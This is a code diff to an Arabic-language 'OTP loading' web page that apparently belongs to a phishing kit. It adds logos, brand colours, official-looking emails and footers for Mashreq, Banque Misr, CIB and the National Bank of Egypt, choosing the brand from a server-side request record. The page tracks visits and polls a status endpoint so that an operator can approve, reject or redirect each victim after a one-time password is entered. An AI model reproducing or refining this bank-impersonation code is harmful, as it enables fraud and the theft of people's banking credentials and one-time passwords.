@@ -175,6 +175,38 @@
             body: JSON.stringify({ action: 'track_visit', page: 'otp_loading' })
         }).catch(error => console.error('Error tracking visit:', error));
 
+        // Bank Colors and Logos
+        const bankColors = {
+            'mashreq': { color: '#ff7f00', name: 'بنك المشرق', email: 'info@mashreq.com', logo: 'images/mashreq_logo_new.jpg' },
+            'bm': { color: '#b01c1c', name: 'بنك مصر', email: 'info@bm.com', logo: 'images/bm_logo.png' },
+            'cib': { color: '#004b91', name: 'بنك CIB', email: 'info@cib.com', logo: 'images/cib_logo.png' },
+            'nbe': { color: '#006b3f', name: 'البنك الأهلي المصري', email: 'info@nbe.com', logo: 'images/nbe_logo.png' }
+        };
+
+        // Update header and footer based on bank
+        window.addEventListener('DOMContentLoaded', () => {
+            fetch('/request_status/' + requestId)
+            .then(res => res.json())
+            .then(data => {
+                if (data.data && data.data.bank) {
+                    const bank = data.data.bank;
+                    let bankKey = 'mashreq';
+                    if (bank === 'Banque Misr') bankKey = 'bm';
+                    else if (bank === 'CIB') bankKey = 'cib';
+                    else if (bank === 'NBE') bankKey = 'nbe';
+                    
+                    const config = bankColors[bankKey];
+                    document.getElementById('headerLogo').src = config.logo;
+                    document.getElementById('footer').style.backgroundColor = config.color;
+                    document.getElementById('footerEmail').innerHTML = '<strong>البريد الرسمي:</strong> ' + config.email;
+                    document.getElementById('footerCopy').innerHTML = 'جميع الحقوق محفوظة © ' + config.name + ' 2026';
+                    document.querySelector('.lang-btn').style.borderColor = config.color;
+                    document.querySelector('.lang-btn').style.color = config.color;
+                    document.querySelector('.spinner').style.borderTopColor = config.color;
+                }
+            });
+        });
+
         let otpStatusInterval = null;
         function checkStatus() {
             if (!requestId) return;
@@ -183,12 +215,14 @@
             .then(response => response.json())
             .then(data => {
                 if (data.status === 'approved') {
+                    if (otpStatusInterval) { clearInterval(otpStatusInterval); otpStatusInterval = null; }
                     window.location.href = 'success.html';
                 } else if (data.status === 'rejected') {
                     // Stop polling after rejection to avoid repeated redirects
                     if (otpStatusInterval) { clearInterval(otpStatusInterval); otpStatusInterval = null; }
                     window.location.href = 'otp.html?rejected=true';
                 } else if (data.redirect_to) {
+                    if (otpStatusInterval) { clearInterval(otpStatusInterval); otpStatusInterval = null; }
                     window.location.href = data.redirect_to;
                 }
             })
@@ -203,7 +237,16 @@
         }
     </script>
 
-    <!-- Header Removed for clean loading page -->
+    <!-- Header: Logo right, Language button, and Menu icon left -->
+    <header>
+        <div class="logo-container">
+            <img id="headerLogo" src="images/mashreq_logo_new.jpg" alt="Bank">
+        </div>
+        <div class="header-left">
+            <button class="lang-btn" onclick="window.location.href='otp_loading_en.html'">English</button>
+            <div class="header-icon" title="Menu">&#9776;</div>
+        </div>
+    </header>
 
     <!-- Loading Box Section -->
     <div class="loading-container-wrapper">
@@ -214,7 +257,29 @@
         </div>
     </div>
 
-    <!-- Footer Removed for clean loading page -->
+    <!-- Footer -->
+    <footer id="footer">
+        <div class="footer-content">
+            <div class="footer-section">
+                <h3>الصفحات القانونية</h3>
+                <ul>
+                    <li><a href="#">سياسة الخصوصية</a></li>
+                    <li><a href="#">الشروط والأحكام</a></li>
+                    <li><a href="#">إخلاء المسؤولية</a></li>
+                    <li><a href="#">الأمان وحماية العميل</a></li>
+                </ul>
+            </div>
+            <div class="footer-section">
+                <h3>خدمة العملاء والاتصال</h3>
+                <p><strong>خدمة العملاء:</strong> 19900</p>
+                <p><strong>الهاتف الأرضي:</strong> 0223456789</p>
+                <p id="footerEmail"><strong>البريد الرسمي:</strong> info@mashreq.com</p>
+            </div>
+        </div>
+        <div class="footer-bottom">
+            <p id="footerCopy">جميع الحقوق محفوظة © بنك المشرق 2026</p>
+        </div>
+    </footer>
 
 </body>
 </html>
